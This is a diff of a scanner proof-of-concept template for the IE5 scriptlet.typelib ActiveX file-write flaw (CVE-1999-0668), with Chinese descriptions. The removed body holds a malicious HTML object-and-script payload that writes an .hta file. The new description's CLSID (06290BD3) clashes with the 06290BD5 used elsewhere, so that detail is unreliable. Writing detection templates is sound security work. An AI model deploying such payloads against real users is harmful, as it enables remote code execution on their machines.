@@ -1,10 +1,13 @@
 [info]
 author = "ave"
-description = "Microsoft Internet Explorer 5 scriptlet.typelib ActiveX 控件被错误标记为对脚本安全(Safe for Scripting)，远程攻击者可构造含 CLSID:06290BD5-48AA-11D2-8432-006008C3FBFC 的恶意网页诱导用户访问，利用 scr.Reset()/scr.Path/scr.Write() 方法绕过安全限制写文件执行任意命令。已被 Bubbleboy 蠕虫利用。"
+description = "通过构造恶意 HTML 页面，利用 scriptlet.typelib ActiveX 控件（CLSID: 06290BD3-48AA-11D2-8432-006008C3FBFC）被错误标记为'对脚本安全'的特性，在用户访问时写入任意文件并执行命令。参考 Exploit-DB 19468。"
 id = "POC-AVE-1999-0184"
-name = "Microsoft Internet Explorer 5 ActiveX TypeLib RCE PoC"
+name = "Microsoft Internet Explorer 5 ActiveX 远程代码执行漏洞 PoC"
 severity = "medium"
-tags = ["ave-1999-0184"]
+tags = [
+    "cve-1999-0668",
+    "ave-1999-0184",
+]
 vuln_id = [
     "CVE-1999-0668",
     "AVE-1999-0184",
@@ -18,12 +21,8 @@ method = "GET"
 path = "/{{BaseURL}}/"
 protocol = "http"
 
-[poc.requests.body]
-content = '<html><body><object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object><script>scr.Reset();scr.Path="C:\\test.hta";scr.Doc=1;scr.Write();</script></body></html>'
-type = "raw"
-
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"]
+words = ["scriptlet.typelib"]
